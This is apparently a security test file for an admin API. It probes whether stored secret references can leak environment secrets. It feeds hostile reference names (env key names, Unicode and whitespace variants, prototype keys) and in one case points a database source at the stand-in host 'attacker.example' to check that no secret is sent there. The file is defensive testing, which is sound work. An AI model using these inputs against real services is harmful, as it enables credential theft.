// Checker B cycle 1 hostile probe H1 (outside the repo). Imports the repo's own fixtures by file URL.
import test from "node:test";
import assert from "node:assert/strict";
const FX = "file:///D:/vc/.worktrees/vca-int/apps/api/tests/admin-fixtures.ts";
const { adminWorld, fakeGithub, ADMIN_PATH } = (await import(FX)) as typeof import("D:/vc/.worktrees/vca-int/apps/api/tests/admin-fixtures.ts");

const SENT = "sentinel-env-value-0xDEADBEEF";
const PG = { kind: "postgres", id: "pg-x", host: "attacker.example", port: 5432, database: "app", user: "reader", sslmode: "require", tables: ["students", "saved_careers", "compare_list", "assessments"] };
const GH = { kind: "github", id: "gh-x", owner: "acme", repo: "backend", branch: "main", service: "school" };

function recorders() {
  const pgCalls: { host: unknown; password: string | undefined }[] = [];
  const ghTokens: (string | undefined)[] = [];
  return {
    pgCalls,
    ghTokens,
    postgres: { async test(config: Record<string, unknown>, password: string | undefined) { pgCalls.push({ host: config.host, password }); return { ok: true }; } },
    github: (token: string | undefined) => { ghTokens.push(token); return fakeGithub({ "migrations/1-a.js": "module.exports={up:async(q,S)=>{await q.createTable('t',{id:{type:S.INTEGER}})}}" }); },
  };
}
const env = { VC_ADMIN_MASTER_KEY: SENT, VC_ADMIN_JWT_SECRET: SENT, MONGODB_URL: SENT, PATHLYNKS_DB_PASSWORD: SENT, GITHUB_TOKEN: SENT, "vc_admin_master_key": SENT };

test("H1a: create refused for hostile ref names (role admin), nothing stored, no leak", async () => {
  const r = recorders();
  const w = await adminWorld({ env, postgres: r.postgres as any, github: r.github as any });
  const admin = await w.token("admin");
  const bad = ["VC_ADMIN_MASTER_KEY", "VC_ADMIN_JWT_SECRET", "MONGODB_URL", "vc_admin_master_key", "pathlynks_db_password", " PATHLYNKS_DB_PASSWORD", "PATHLYNKS_DB_PASSWORD ", "PATHLYNKS_DB_PASSWORD\n", "\nPATHLYNKS_DB_PASSWORD", "PATHLYNKS_DB_PASSWORD\u0000", "ＰATHLYNKS_DB_PASSWORD", "PATHLYNKS", "PATHLYNKS_\u2028", "GITHUB", "__proto__", "constructor", "PATHLYNKS_DB_PASSWORD\u200b", ["PATHLYNKS_DB_PASSWORD"], { toString: "x" }, 7, null, ""];
  for (const ref of bad) {
    const a = await w.call("POST", `${ADMIN_PATH}sources`, { token: admin, body: { ...PG, id: "pg-bad", passwordRef: ref } });
    assert.equal(a.status, 400, `pg ref ${JSON.stringify(ref)} -> ${a.status}`);
    const b = await w.call("POST", `${ADMIN_PATH}sources`, { token: admin, body: { ...GH, id: "gh-bad", tokenRef: ref } });
    assert.ok(b.status === 400, `gh ref ${JSON.stringify(ref)} -> ${b.status}`);
  }
  assert.deepEqual(await w.store.sources.list(), []);
  assert.equal(r.pgCalls.length + r.ghTokens.length, 0);
});

test("H1b: stored legacy doc with hostile ref: test+sync never read env value, no leak anywhere", async () => {
  const r = recorders();
  const w = await adminWorld({ env, postgres: r.postgres as any, github: r.github as any });
  const admin = await w.token("admin");
  for (const ref of ["VC_ADMIN_MASTER_KEY", "MONGODB_URL", "vc_admin_master_key", "PATHLYNKS_DB_PASSWORD\n", { a: 1 }, 5]) {
    await w.store.sources.upsert({ id: "legacy-pg", siteId: "pathlynks", kind: "postgres", config: { ...PG, id: undefined, kind: undefined, passwordRef: ref } as any });
    await w.store.sources.upsert({ id: "legacy-gh", siteId: "pathlynks", kind: "github", config: { ...GH, id: undefined, kind: undefined, tokenRef: ref } as any });
    for (const [id, act] of [["legacy-pg", "test"], ["legacy-gh", "test"], ["legacy-gh", "sync"]]) {
      const res = await w.call("POST", `${ADMIN_PATH}sources/${id}/${act}`, { token: admin, body: {} });
      assert.ok(!res.body.includes(SENT), `${id} ${act} body leaked`);
    }
  }
  assert.deepEqual(r.pgCalls.filter((c) => c.password !== undefined), [], "postgres port never got a password");
  assert.deepEqual(r.ghTokens.filter((t) => t !== undefined), [], "github port never got a token");
  const dump = JSON.stringify([w.logs, w.auditRows()]);
  assert.ok(!dump.includes(SENT), "no leak in logs/audit");
});

test("H1c: error text carrying the env value never reaches response/log/audit/stored diagnostics (allowed ref)", async () => {
  const w = await adminWorld({
    env,
    postgres: { async test() { throw new Error(`boom ${SENT}`); } } as any,
    github: (() => ({ async listTree() { throw new Error(`boom ${SENT}`); }, async getBlob() { throw new Error(`boom ${SENT}`); } })) as any,
  });
  const admin = await w.token("admin");
  await w.store.sources.upsert({ id: "ok-pg", siteId: "pathlynks", kind: "postgres", config: { ...PG, id: undefined, kind: undefined, passwordRef: "PATHLYNKS_DB_PASSWORD" } as any });
  await w.store.sources.upsert({ id: "ok-gh", siteId: "pathlynks", kind: "github", config: { ...GH, id: undefined, kind: undefined, tokenRef: "GITHUB_TOKEN" } as any });
  for (const [id, act] of [["ok-pg", "test"], ["ok-gh", "test"], ["ok-gh", "sync"]]) {
    const res = await w.call("POST", `${ADMIN_PATH}sources/${id}/${act}`, { token: admin, body: {} });
    assert.ok(!res.body.includes(SENT), `${id} ${act} body leaked: ${res.body}`);
  }
  for (const route of ["sources", "audit"]) assert.ok(!(await w.call("GET", `${ADMIN_PATH}${route}`, { token: admin })).body.includes(SENT));
  assert.ok(!JSON.stringify([w.logs, w.auditRows(), w.fakeDb.collection("sources").all(), w.fakeDb.collection("source_artifacts").all()]).includes(SENT));
});

test("H1d RESIDUAL: admin (not super-admin) points an ALLOWED ref at an attacker host: does the env secret reach the attacker host?", async () => {
  const r = recorders();
  const w = await adminWorld({ env, postgres: r.postgres as any, github: r.github as any });
  const admin = await w.token("admin");
  const c = await w.call("POST", `${ADMIN_PATH}sources`, { token: admin, body: { ...PG, id: "pg-evil", passwordRef: "PATHLYNKS_DB_PASSWORD" } });
  console.log("H1d create status", c.status);
  const t = await w.call("POST", `${ADMIN_PATH}sources/pg-evil/test`, { token: admin, body: {} });
  console.log("H1d test status", t.status, "calls", JSON.stringify(r.pgCalls.map((x) => ({ host: x.host, gotSecret: x.password === SENT }))));
  assert.equal(r.pgCalls.some((x) => x.host === "attacker.example" && x.password === SENT), false, "EXFIL: env secret handed to attacker host");
});
